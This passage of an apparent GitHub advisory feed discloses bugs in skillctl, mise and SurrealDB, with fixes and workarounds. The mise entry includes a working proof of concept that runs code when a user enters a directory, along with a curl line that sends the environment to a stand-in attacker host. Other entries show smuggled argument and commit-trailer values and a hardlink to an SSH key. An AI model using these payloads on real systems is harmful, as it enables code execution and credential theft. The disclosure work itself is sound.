<li><strong><code>source_sha</code> argument injection in <code>git ls-tree</code> (CRITICAL).</strong> <code>InstalledSkill.source_sha</code> deserialized from <code>.skills.toml</code> (committed, PR-mergeable) flowed unvalidated into <code>git ls-tree -r -z &lt;refspec&gt; -- &lt;path&gt;</code>. Because the refspec sits before <code>--</code>, an attacker who slipped a malicious <code>.skills.toml</code> into a PR could set <code>source_sha = "--name-only"</code> / <code>--abbrev=0</code> / <code>--output=…</code> and corrupt the diff classifier (which drives <code>pull</code> / <code>push</code> destructive decisions), or forge a divergence state to trick <code>push --on-divergence overwrite</code> into clobbering the wrong content.</li>
<li><strong>FIFO / device / socket denial-of-service in <code>copy_dir_all</code> (CRITICAL).</strong> The file-type branch only checked <code>is_dir()</code> / <code>is_symlink()</code>; a FIFO inside a skill folder fell through to <code>fs::copy</code>, which blocks indefinitely waiting for a writer. A character device like <code>/dev/zero</code> would read until OOM. Reachable on <code>skillctl add</code> against any adversarial library.</li>
<li><strong><code>add --dest</code> arbitrary-directory wipe in agent mode (HIGH).</strong> <code>--dest</code> accepted absolute paths and <code>..</code> traversal without validation, so a single invocation <code>skillctl add --dest /Users/victim/.ssh --on-conflict overwrite --skill &lt;maliciously-named&gt;</code> would <code>remove_dir_all</code> arbitrary directories — no <code>.skills.toml</code> round-trip required. Reachable in any non-interactive / agent-driven workflow where flag values may be attacker-supplied.</li>
<li><strong>Commit-message trailer forgery via skill names (HIGH).</strong> Skill names were spliced verbatim into <code>git commit -m "update skill: &lt;name&gt;"</code> and into the <code>commit.message</code> field of <code>--json</code> output. A skill named <code>foo\nCo-Authored-By: evil@x</code> produced a forged commit trailer that downstream tooling (Linear, GitHub commit-bot, release-notes scrapers) treats as real authorship metadata.</li>
<li><strong>Hardlink exfiltration via the round-trip (HIGH).</strong> <code>fs::symlink_metadata</code> reports a regular file for hardlinks (shared inode), and <code>fs::copy</code> reads the target content. An untrusted agent writing <code>&lt;project&gt;/my-skill/data</code> as a hardlink to <code>~/.ssh/id_rsa</code> would have shipped the SSH key content to the (possibly public) library on the next <code>skillctl push</code> or <code>detect</code>.</li>
</ol>
<h2 id="patches">Patches</h2>
<p>Fixed in <a href="https://github.com/umanio-agency/skillctl/releases/tag/v0.1.3">v0.1.3</a>:</p>
<ul>
<li><code>InstalledSkill::validate</code> rejects any <code>source_sha</code> that isn't 40–64 hex characters.</li>
<li><code>fs_util::copy_dir_all</code> only allows regular files and directories; FIFO / socket / device / other special files are rejected with <code>AppError::Config</code>.</li>
<li><code>commands::add::resolve_destination</code> rejects <code>..</code> unconditionally and rejects absolute paths in non-interactive / <code>--json</code> mode.</li>
<li>New <code>src/sanitize.rs</code> module: <code>validate_identifier</code> (strict, no control bytes / newlines / ESC, used for skill <code>name</code> + individual <code>tags</code>) and <code>validate_message_safe</code> (lenient, allows <code>\n</code> + <code>\t</code>, rejects <code>\r</code> + DEL + C0/C1 controls, used for <code>description</code> and <code>--message</code>). Wired at the <code>skill::discover</code> and <code>read_tags</code> boundaries so poisoned skills are dropped silently and poisoned descriptions/tags are stripped from otherwise-valid skills.</li>
<li><code>fs_util::copy_dir_all</code> checks <code>metadata.nlink() &gt; 1</code> on regular files (Unix) and refuses hardlinked content.</li>
</ul>
<p>All checks are lexical or single-syscall (<code>symlink_metadata</code>, <code>metadata</code>). No <code>canonicalize</code>, no TOCTOU windows. 23 new unit + integration tests cover each rejection class; <code>cargo test</code>: 95 pass; clippy clean; <code>cargo audit</code> clean.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrade to v0.1.3. Pre-patch mitigations are awkward but possible:</p>
<ul>
<li>Audit every <code>.skills.toml</code> <code>source_sha</code> field before running <code>skillctl pull</code> / <code>push</code> / <code>detect</code>.</li>
<li>Audit library content for FIFO / device files and hardlinks before running <code>skillctl add</code>.</li>
<li>Never invoke <code>skillctl add</code> with attacker-controllable <code>--dest</code> values in agent / CI contexts.</li>
<li>Never use <code>--message</code> with attacker-controlled content.</li>
</ul>
<h2 id="credit">Credit</h2>
<p>The findings were surfaced by a maintainer-led multi-angle audit (6 parallel sub-agents, one per threat-model dimension) following the firebaguette audit that motivated v0.1.2. The methodology (cross-agent convergence to identify the most exploitable items) is documented in the project's internal decisions log; the strongest signal was the four-of-six independent convergence on the <code>source_sha</code> vector.</p>
<h2 id="resources">Resources</h2>
<ul>
<li>Fix commit: <a href="https://github.com/umanio-agency/skillctl/commit/28dfce3">28dfce3</a></li>
<li>Release: <a href="https://github.com/umanio-agency/skillctl/releases/tag/v0.1.3">https://github.com/umanio-agency/skillctl/releases/tag/v0.1.3</a></li>
<li>Prior advisory (path-safety + symlinks): <a href="https://github.com/umanio-agency/skillctl/security/advisories/GHSA-wx3m-whqv-xv47">GHSA-wx3m-whqv-xv47</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/umanio-agency/skillctl/security/advisories/GHSA-74p7-6h78-gw8p">https://github.com/umanio-agency/skillctl/security/advisories/GHSA-74p7-6h78-gw8p</a></li>
<li><a href="https://github.com/umanio-agency/skillctl/security/advisories/GHSA-wx3m-whqv-xv47">https://github.com/umanio-agency/skillctl/security/advisories/GHSA-wx3m-whqv-xv47</a></li>
<li><a href="https://github.com/umanio-agency/skillctl/commit/28dfce3">https://github.com/umanio-agency/skillctl/commit/28dfce3</a></li>
<li><a href="https://github.com/umanio-agency/skillctl/releases/tag/v0.1.3">https://github.com/umanio-agency/skillctl/releases/tag/v0.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-74p7-6h78-gw8p">https://github.com/advisories/GHSA-74p7-6h78-gw8p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-74p7-6h78-gw8p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-22T22:45:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mise] Mise Vulnerable to Arbitrary Code Execution via Tera Templates in .tool-versions Files (Trust Bypass)]]></title>
        <id>https://github.com/advisories/GHSA-fjj5-v948-whjj</id>
        <link href="https://github.com/advisories/GHSA-fjj5-v948-whjj"/>
        <updated>2026-06-22T17:19:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Mise processes <code>.tool-versions</code> files through the Tera template engine during parsing, with the <code>exec()</code> function registered, enabling arbitrary command execution. Unlike <code>.mise.toml</code> files, <code>.tool-versions</code> files are <strong>not subject to trust verification</strong> in non-paranoid mode. This means an attacker can place a malicious <code>.tool-versions</code> file in a git repository, and when a victim with mise activated <code>cd</code>s into the directory, arbitrary commands execute without any trust prompt.</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<h3 id="vulnerable-code">Vulnerable Code</h3>
<p><strong>File:</strong> <code>src/config/config_file/tool_versions.rs</code>, lines 60-63</p>
<pre><code class="language-rust">pub fn parse_str(s: &amp;str, path: PathBuf) -&gt; Result&lt;Self&gt; {
    let mut cf = Self::init(&amp;path);
    let dir = path.parent();
    let s = get_tera(dir).render_str(s, &amp;cf.context)?;  // &lt;-- No trust check
    // ...
}
</code></pre>
<p><strong>File:</strong> <code>src/tera.rs</code>, lines 385-391</p>
<pre><code class="language-rust">pub fn get_tera(dir: Option&lt;&amp;Path&gt;) -&gt; Tera {
    let mut tera = TERA.clone();
    let dir = dir.map(PathBuf::from);
    tera.register_function("exec", tera_exec(dir.clone(), env::PRISTINE_ENV.clone()));
    tera.register_function("read_file", tera_read_file(dir));
    tera
}
</code></pre>
<p><strong>File:</strong> <code>src/tera.rs</code>, lines 394-452 -- <code>tera_exec</code> passes the <code>command</code> argument to a shell for execution with no restrictions.</p>
<p><strong>File:</strong> <code>src/config/config_file/mod.rs</code>, lines 272-287</p>
<pre><code class="language-rust">pub async fn parse(path: &amp;Path) -&gt; Result&lt;Arc&lt;dyn ConfigFile&gt;&gt; {
    if let Ok(settings) = Settings::try_get()
        &amp;&amp; settings.paranoid
    {
        trust_check(path)?;  // Only in paranoid mode!
    }
    match detect_config_file_type(path).await {
        // ...
        Some(ConfigFileType::ToolVersions) =&gt; Ok(Arc::new(ToolVersions::from_file(path)?)),
        // ...
    }
}
</code></pre>
<h3 id="attack-vector">Attack Vector</h3>
<ol>
<li>An attacker creates a <code>.tool-versions</code> file in a git repository containing Tera template syntax with the <code>exec()</code> function.</li>
<li>The victim clones the repository and has mise activated in their shell (via <code>eval "$(mise activate zsh)"</code> or equivalent).</li>
<li>When the victim <code>cd</code>s into the repository directory, mise's shell hook (<code>hook-env</code>) fires automatically.</li>
<li><code>hook-env</code> loads and parses config files, including <code>.tool-versions</code>.</li>
<li>During parsing, <code>ToolVersions::parse_str</code> processes the file content through <code>get_tera(dir).render_str()</code>.</li>
<li>The Tera engine evaluates <code>{{ exec(command="...") }}</code>, executing arbitrary commands as the victim's user.</li>
<li>No trust prompt is displayed because <code>trust_check</code> is not called for <code>.tool-versions</code> files in non-paranoid mode.</li>
</ol>
<h3 id="execution-context">Execution Context</h3>
<ul>
<li>Commands execute as the current user with full access to their environment.</li>
<li>The pristine environment (<code>env::PRISTINE_ENV</code>) is passed to the executed command, which includes all of the user's environment variables (potentially including tokens, credentials, SSH agents, etc.).</li>
<li>Execution happens silently during the prompt hook -- the user sees no indication that code was run.</li>
</ul>
<h3 id="contrast-with-misetoml">Contrast with .mise.toml</h3>
<p><code>.mise.toml</code> files are protected: <code>MiseToml::from_str()</code> calls <code>trust_check(path)</code> before any parsing occurs (line 213 of <code>mise_toml.rs</code>). During <code>hook-env</code>, untrusted <code>.mise.toml</code> files fail to parse with an <code>UntrustedConfig</code> error, preventing any code execution. <code>.tool-versions</code> files lack this protection entirely.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<h3 id="prerequisites">Prerequisites</h3>
<ul>
<li>mise installed (<code>brew install mise</code> or equivalent)</li>
<li>Shell activation enabled: <code>eval "$(mise activate zsh)"</code> (or bash/fish)</li>
<li>Default settings (paranoid mode NOT enabled — this is the default)</li>
</ul>
<h3 id="poc-silent-rce-on-cd">PoC: Silent RCE on <code>cd</code></h3>
<p><strong>Step 1:</strong> Create a directory simulating a cloned repository with a malicious <code>.tool-versions</code>:</p>
<pre><code class="language-bash">mkdir -p /tmp/poc-mise-repo
cd /tmp/poc-mise-repo
git init

cat &gt; .tool-versions &lt;&lt; 'EOF'
{{ exec(command="id &gt; /tmp/mise-rce-proof &amp;&amp; echo SUCCESS=$(whoami) &gt;&gt; /tmp/mise-rce-proof &amp;&amp; date &gt;&gt; /tmp/mise-rce-proof") }}node 20.0.0
python 3.11.0
EOF

git add -A &amp;&amp; git commit -m "Initial commit"
</code></pre>
<p>Note: The <code>exec()</code> output is concatenated with <code>node</code> so the resulting line parses as a valid tool-versions entry. The payload redirects all output to a file, producing no stdout — the <code>exec()</code> returns an empty string, making the line evaluate to <code>node 20.0.0</code>.</p>
<p><strong>Step 2:</strong> In a new shell with mise activated, enter the directory:</p>
<pre><code class="language-bash">eval "$(mise activate zsh)"
cd /tmp/poc-mise-repo
</code></pre>
<p><strong>Step 3:</strong> Verify arbitrary code execution:</p>
<pre><code class="language-bash">cat /tmp/mise-rce-proof
</code></pre>
<p><strong>Expected output:</strong></p>
<pre><code>uid=501(youruser) gid=20(staff) groups=20(staff),...
SUCCESS=youruser
Mon Mar 16 21:34:46 IST 2026
</code></pre>
<p>No trust prompt, no warning, no error output. The <code>id</code> command executed silently as the current user.</p>
<h3 id="validated-test-results">Validated Test Results</h3>
<p>Tested on 2026-03-16 with:</p>
<ul>
<li>mise 2026.3.9 macos-arm64</li>
<li>macOS Darwin 24.5.0 arm64</li>
<li>zsh 5.9</li>
<li>Paranoid mode: <code>false</code> (default)</li>
</ul>
<p><strong>Test 1 — <code>.tool-versions</code> (no trust check):</strong></p>
<pre><code>$ rm -f /tmp/mise-rce-proof
$ zsh -c 'eval "$(mise activate zsh)" &amp;&amp; cd /tmp/poc-mise-repo &amp;&amp; pwd'
/tmp/poc-mise-repo
$ cat /tmp/mise-rce-proof
uid=501(golan) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),...
SUCCESS=golan
Mon Mar 16 21:34:46 IST 2026
</code></pre>
<p>Command executed silently. No trust prompt. No errors.</p>
<p><strong>Test 2 — <code>.mise.toml</code> with same payload (trust check blocks execution):</strong></p>
<pre><code>$ mkdir -p /tmp/poc-mise-toml
$ cat &gt; /tmp/poc-mise-toml/.mise.toml &lt;&lt; 'TOMLEOF'
[tools]
node = "{{ exec(command='id &gt; /tmp/mise-hook-pwned') }}20.0.0"
TOMLEOF
$ rm -f /tmp/mise-hook-pwned
$ zsh -c 'eval "$(mise activate zsh)" &amp;&amp; cd /tmp/poc-mise-toml &amp;&amp; pwd'
mise ERROR Config files in /private/tmp/poc-mise-toml/.mise.toml are not trusted.
Trust them with `mise trust`. See https://mise.jdx.dev/cli/trust.html
$ cat /tmp/mise-hook-pwned
cat: /tmp/mise-hook-pwned: No such file or directory
</code></pre>
<p><code>.mise.toml</code> correctly blocked by trust verification. <code>.tool-versions</code> bypasses it entirely.</p>
<h3 id="alternative-poc-data-exfiltration">Alternative PoC (data exfiltration)</h3>
<pre><code>{{ exec(command="curl -s -X POST -d \"$(env | base64)\" https://attacker.example.com/collect -o /dev/null") }}python 3.11.0
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Arbitrary code execution</strong> on any machine where a user with mise activated enters a directory containing a malicious <code>.tool-versions</code> file.</li>
<li><strong>Supply chain attack vector</strong>: <code>.tool-versions</code> is a widely-used convention from asdf-vm and is commonly committed to repositories. Developers expect it to contain only tool names and versions, not executable content.</li>
<li><strong>Silent execution</strong>: No trust prompt, warning, or user interaction required.</li>
<li><strong>Full user privilege escalation</strong>: Commands run with the full privileges and environment of the current user.</li>
<li><strong>Credential theft</strong>: The user's full environment (including tokens, API keys, SSH agent) is available to the executed command.</li>
<li><strong>Widespread potential impact</strong>: Any open-source project with a <code>.tool-versions</code> file could be targeted. A malicious PR adding tera syntax to an existing <code>.tool-versions</code> file could execute code on all reviewers' machines.</li>
</ul>
<h2 id="suggested-fix">Suggested Fix</h2>
<h3 id="option-1-add-trust_check-to-tool-versions-parsing-recommended">Option 1: Add trust_check to .tool-versions parsing (recommended)</h3>
<pre><code class="language-rust">// In src/config/config_file/tool_versions.rs
pub fn from_file(path: &amp;Path) -&gt; Result&lt;Self&gt; {
    trace!("parsing tool-versions: {}", path.display());
    Self::parse_str(&amp;file::read_to_string(path)?, path.to_path_buf())
}

pub fn parse_str(s: &amp;str, path: PathBuf) -&gt; Result&lt;Self&gt; {
    let mut cf = Self::init(&amp;path);
    let dir = path.parent();
    // Only use tera if the file contains template syntax AND is trusted
    let s = if s.contains("{{") || s.contains("{%") || s.contains("{#") {
        trust_check(&amp;path)?;
        get_tera(dir).render_str(s, &amp;cf.context)?
    } else {
        s.to_string()
    };
    // ...
}
</code></pre>
<h3 id="option-2-remove-exec-from-tool-versions-tera-context">Option 2: Remove exec() from .tool-versions tera context</h3>
<p>Create a separate <code>get_tera_safe()</code> that does not register the <code>exec</code> function, and use it for <code>.tool-versions</code> parsing.</p>
<h3 id="option-3-remove-tera-processing-from-tool-versions-entirely">Option 3: Remove tera processing from .tool-versions entirely</h3>
<p><code>.tool-versions</code> is an asdf-compatible format that historically does not support templates. Removing tera from its parsing would be the safest approach and most consistent with user expectations.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jdx/mise/security/advisories/GHSA-fjj5-v948-whjj">https://github.com/jdx/mise/security/advisories/GHSA-fjj5-v948-whjj</a></li>
<li><a href="https://github.com/advisories/GHSA-fjj5-v948-whjj">https://github.com/advisories/GHSA-fjj5-v948-whjj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fjj5-v948-whjj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-22T17:19:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB: Denial of Service via deep operator chains]]></title>
        <id>https://github.com/advisories/GHSA-jv2j-mqmw-xvv5</id>
        <link href="https://github.com/advisories/GHSA-jv2j-mqmw-xvv5"/>
        <updated>2026-06-19T22:10:56.000Z</updated>
        <content type="html"><![CDATA[<p>An authenticated user could crash a SurrealDB server with a single query containing a long chain of operators.</p>
<p>Such a query — for example <code>RETURN 1 + 1 + 1 + ...</code> with tens of thousands of terms — is parsed into an expression tree one level deep per operator. Because the chain is flat and the pratt parser appends to it iteratively, the configured query- and object-recursion limits never fire, so the tree grows unbounded with the length of the query.</p>
<p>The root cause: the over-deep tree is later walked recursively, one call per node, when it is dropped, formatted, or lowered for execution — overflowing the thread stack and aborting the process.</p>
<h3 id="impact">Impact</h3>
<p>An authenticated user with query-execution privileges can crash a SurrealDB server with a single query containing a long chain of operators. The whole process aborts, denying service to every namespace and database on that instance until it is restarted. The crash occurs during query processing, before any data is read or written (availability only).</p>
<h3 id="patches">Patches</h3>
<p>A patch introduces a dedicated expression-depth budget — <code>expr_recursion_limit</code>, sourced from <code>max_expression_parsing_depth</code> (default 128, configurable via <code>SURREAL_MAX_EXPRESSION_PARSING_DEPTH</code>). It is charged once per pratt-parser level and once per operator appended to the spine, so an over-deep operator chain is rejected with a syntax error instead of building a tree that overflows the stack downstream. Paths that re-parse already-validated stored data are exempted, so existing databases with deep stored expressions still load.</p>
<ul>
<li>Versions 3.1.5 and later are not affected by this issue.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Users unable to patch should consider the following workarounds:</p>
<ul>
<li>Restrict the ability of untrusted users to execute arbitrary queries via the <code>--deny-arbitrary-query</code> capability flag for the affected user classes (guest, record, or system).</li>
<li>Restrict untrusted access to the WebSocket <code>/rpc</code> endpoint, which accepts larger request bodies than the HTTP <code>/sql</code> endpoint. The <code>/sql</code> endpoint's 1 MiB body limit lowers the achievable operator depth but does not by itself guarantee the stack cannot be exhausted.</li>
<li>Run SurrealDB under an orchestrator or process manager that restarts it automatically on exit (e.g. Kubernetes, systemd <code>Restart=on-failure</code>, or a Docker restart policy), so the server recovers immediately after a crash. This limits downtime from a successful attack but does not prevent the crash.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://surrealdb.com/docs/surrealql/operators">SurrealQL Documentation — Operators</a></li>
<li><code>fix(syn): bound expression operator-tree depth to prevent stack-overflow DoS</code></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-jv2j-mqmw-xvv5">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-jv2j-mqmw-xvv5</a></li>
<li><a href="https://github.com/advisories/GHSA-jv2j-mqmw-xvv5">https://github.com/advisories/GHSA-jv2j-mqmw-xvv5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jv2j-mqmw-xvv5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T22:10:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB: Field-level SELECT permissions bypassed via graph and reference traversals]]></title>
        <id>https://github.com/advisories/GHSA-hv6h-hc26-q48p</id>
        <link href="https://github.com/advisories/GHSA-hv6h-hc26-q48p"/>
        <updated>2026-06-19T22:10:56.000Z</updated>
        <content type="html"><![CDATA[<p>A record user could read field values hidden from them by field-level SELECT permissions by reaching the records through a graph-edge (<code>-&gt;</code>) or back-reference (<code>&lt;~</code>) traversal instead of a direct <code>SELECT</code>.</p>
<p>When a table was readable at the table level but carried a field hidden by a field-level permission (<code>DEFINE FIELD secret ON knows PERMISSIONS FOR select NONE</code>), a direct <code>SELECT * FROM knows</code> hid <code>secret</code> — but reaching the same records through a traversal that yields full objects — <code>person:bob-&gt;(SELECT * FROM knows)</code>, <code>person:bob&lt;~(SELECT * FROM comment)</code>, or a projected target vertex <code>-&gt;knows-&gt;(SELECT * FROM person)</code> — returned it intact.</p>
<p>The root cause: the shared <code>resolve_record_batch</code> helper used by <code>GraphEdgeScan</code> (<code>FullEdge</code>) and <code>ReferenceScan</code> (<code>FullRecord</code>) enforced only the table-level SELECT permission and pushed raw record data, never running the field-level filtering (<code>build_field_state</code> / <code>filter_fields_by_permission</code>) that ordinary table scans and <code>fetch_record</code> apply.</p>
<h3 id="impact">Impact</h3>
<p>A record user can read the values of fields hidden by field-level SELECT permissions, on tables they already hold table-level SELECT on, by materialising the records through a graph-edge, back-reference, or target-vertex traversal — recovering the values directly, for every record the traversal returns.</p>
<p>The disclosure is confined to the field-permission layer: it grants <strong>no unauthorised cross-table, cross-record, or cross-namespace/database access</strong>. The table's own SELECT permission — including any row-level <code>WHERE</code> predicate — is still enforced, so the caller only reaches records they were already entitled to read; only the per-field SELECT filtering within those records is skipped. Root and record-owner sessions are unaffected, and data cannot be modified (confidentiality only).</p>
<p>Table-level enforcement on these traversals landed in 3.1.0 (the fix for GHSA-vjjx-rfw4-rmfc); releases before 3.1.0 additionally exposed whole records on tables the caller could not read, and are covered by that advisory.</p>
<h3 id="patches">Patches</h3>
<p><code>resolve_record_batch</code> (the shared helper that materialises full records for graph and reference traversals) now applies field-level SELECT permissions and read-time <code>COMPUTED</code> fields to each record, matching the regular table-scan and <code>fetch_record</code> paths.</p>
<p>Versions 3.1.5 and later are not affected.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Force the unaffected legacy executor with <code>--planner-strategy compute-only</code> (env <code>SURREAL_PLANNER_STRATEGY</code>).</li>
<li>Do not rely on field-level SELECT permissions to hide values on tables reachable as a graph edge, reference target, or traversal vertex; restrict at the table level instead.</li>
<li>Use namespace / database isolation as the primary boundary where feasible.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://surrealdb.com/docs/surrealql/statements/define/field">SurrealQL Documentation — DEFINE FIELD</a></li>
<li><a href="https://surrealdb.com/docs/surrealql/statements/define/table">SurrealQL Documentation — DEFINE TABLE … PERMISSIONS</a></li>
<li><a href="https://surrealdb.com/docs/surrealql/datamodel/relationships">SurrealQL Documentation — Graph relationships</a></li>
<li><code>fix(exec): apply field-level SELECT permissions + computed fields when graph/reference traversals materialize full records</code></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-hv6h-hc26-q48p">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-hv6h-hc26-q48p</a></li>
<li><a href="https://github.com/advisories/GHSA-hv6h-hc26-q48p">https://github.com/advisories/GHSA-hv6h-hc26-q48p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hv6h-hc26-q48p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T22:10:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB: Indexed ORDER BY leaks the value ordering of a SELECT-restricted field]]></title>
        <id>https://github.com/advisories/GHSA-h4h3-3rfj-x6fq</id>
        <link href="https://github.com/advisories/GHSA-h4h3-3rfj-x6fq"/>
        <updated>2026-06-19T22:10:53.000Z</updated>
        <content type="html"><![CDATA[<p>A field can be hidden from a user with a field-level SELECT permission (<code>DEFINE FIELD code ON secret PERMISSIONS FOR select WHERE owner = $auth.id</code>). When that field is indexed, a record user who cannot read it could still recover the relative ordering of its values across every record by issuing <code>ORDER BY &lt;field&gt;</code>: the field came back <code>null</code> as intended, but the rows were returned in the hidden values' true sorted order.</p>
<p>To satisfy the sort, the planner selects the field's index and walks it in value order; the field-level permission is applied later, when the row is projected, so the value is nulled but the row order already encodes it. The guard that withholds restricted fields from the <code>WHERE</code> path was never applied to <code>ORDER BY</code>.</p>
<h2 id="impact">Impact</h2>
<p>What an attacker <strong>can</strong> do:</p>
<ul>
<li>As a record (scope) user with table SELECT, learn the relative ordering of a field hidden by a field-level SELECT permission, across other users' records, by ordering on it when an index covers the field — the value returns <code>null</code>, but the rows come back in the hidden values' order.</li>
<li>With rows they control in the same table, use that ordering to narrow the hidden values toward exact ones.</li>
</ul>
<p>What it <strong>can't</strong> do:</p>
<ul>
<li>Read the field value directly — only its relative ordering leaks; the projected value is correctly redacted.</li>
<li>Cross table, record, or namespace/database boundaries — the table's SELECT permission and any row-level <code>WHERE</code> are still enforced, so only records the caller may already read are ordered.</li>
<li>Leak anything when the restricted field is not indexed, affect root or record-owner sessions, or modify data (confidentiality only).</li>
</ul>
<h2 id="patches">Patches</h2>
<p>The query planner now applies the field-permission guard to the <code>ORDER BY</code> clause as well as the <code>WHERE</code> clause. When an ordered field is hidden from the caller by a field-level SELECT permission, the index sort pushdown is withheld and the rows are sorted after redaction instead, so the row order no longer reflects the hidden values. The dynamic-scan fallback is closed the same way, and a regression test was added.</p>
<p>The fix is included in SurrealDB 3.1.5.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Users unable to upgrade are advised to consider the following:</p>
<ul>
<li>Force the legacy executor with <code>SURREAL_PLANNER_STRATEGY=compute-only</code>; the sort then runs after redaction, so no ordering leaks.</li>
<li>Do not place an index on a field whose values are hidden by a field-level SELECT permission — without the index the leak does not occur.</li>
<li>Do not rely on field-level SELECT permissions to hide values on indexed fields from record users; restrict at the table level instead.</li>
<li>Use namespace / database isolation as the primary trust boundary where feasible.</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://surrealdb.com/docs/surrealql/statements/define/field">SurrealQL Documentation — DEFINE FIELD</a></li>
<li><a href="https://surrealdb.com/docs/surrealql/statements/define/indexes">SurrealQL Documentation — DEFINE INDEX</a></li>
<li><a href="https://surrealdb.com/docs/surrealql/statements/define/table">SurrealQL Documentation — DEFINE TABLE … PERMISSIONS</a></li>
<li>Related advisory (same class, indexed COUNT variant): <a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-c8jx-96c9-8xrp">GHSA-c8jx-96c9-8xrp</a></li>
<li><code>fix(planner): prevent ORDER BY value-ordering oracle on restricted SELECT fields</code></li>
<li><code>fix(planner): close ORDER BY value-ordering oracle on the DynamicScan fallback</code></li>
</ul>
<h2 id="acknowledgements">Acknowledgements</h2>
<p>Thanks to George Chen (<a href="https://github.com/geo-chen">@geo-chen</a>) for finding and reporting this issue.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-h4h3-3rfj-x6fq">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-h4h3-3rfj-x6fq</a></li>
<li><a href="https://github.com/advisories/GHSA-h4h3-3rfj-x6fq">https://github.com/advisories/GHSA-h4h3-3rfj-x6fq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h4h3-3rfj-x6fq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T22:10:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB: Arbitrary file read via DEFINE ANALYZER mapper() filter]]></title>
        <id>https://github.com/advisories/GHSA-cc8f-fcx3-gpjr</id>
        <link href="https://github.com/advisories/GHSA-cc8f-fcx3-gpjr"/>
        <updated>2026-06-19T22:10:50.000Z</updated>
        <content type="html"><![CDATA[<p>SurrealDB's full-text search lets you define a text analyzer whose <code>mapper</code> filter loads a term-mapping file from disk (<code>DEFINE ANALYZER ... FILTERS mapper('&lt;path&gt;')</code>). A database user with the <code>EDITOR</code> or <code>OWNER</code> role could point that filter at any file the SurrealDB process can read and have its content returned in the query's error message.</p>
<p>File access is meant to be restricted by the <code>SURREAL_FILE_ALLOWLIST</code> setting, but an empty allowlist applied no restriction at all — and empty is the default. </p>
<h2 id="impact">Impact</h2>
<p>The file is read with the privileges of the SurrealDB process, so a database <code>EDITOR</code> or <code>OWNER</code> user can disclose the contents of any file the process can access. Only the <strong>first line</strong> of the file is returned, except for files with no newlines.</p>
<p>However recovering the process's command line and environment could expose startup root credentials (<code>--user</code> / <code>--pass</code>) and secret environment variables, escalating a single-database role toward full control of the instance.</p>
<p>The read on the underlying filesystem is bounded by what the SurrealDB process can reach — any file readable by the OS user it runs as — so the impact scales with how the process is run and what is mounted into it.</p>
<h2 id="patches">Patches</h2>
<p>A patch has been included in SurrealDB 3.1.5.</p>
<p>File access is now secure by default. <code>check_is_path_allowed</code> denies every path when no <code>SURREAL_FILE_ALLOWLIST</code> is configured, so the <code>mapper</code> filter cannot open any file unless the operator has explicitly allowed its directory. Analyzer parse errors no longer include the contents of the mapped file, only the line number.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Users unable to upgrade are advised to consider the following:</p>
<ul>
<li>Set <code>SURREAL_FILE_ALLOWLIST</code> to a directory that contains only the intended mapping files; this confines the <code>mapper</code> filter to that path. On affected versions the allowlist must be non-empty to have any effect.</li>
<li>Grant the <code>EDITOR</code> and <code>OWNER</code> database roles only to trusted principals.</li>
<li>Avoid supplying secrets — including the root credentials — on the command line or through environment variables; prefer mounted files with least-privilege permissions.</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://surrealdb.com/docs/surrealql/statements/define/analyzer#define-analyzer-statement">SurrealQL Documentation — DEFINE ANALYZER</a></li>
<li><a href="https://surrealdb.com/docs/surrealdb/security/capabilities">SurrealDB Documentation — Capabilities</a></li>
<li>Related earlier advisory: <a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-2cvj-g5r5-jrrg">GHSA-2cvj-g5r5-jrrg</a> local file read of 2-column TSV files via analyzers</li>
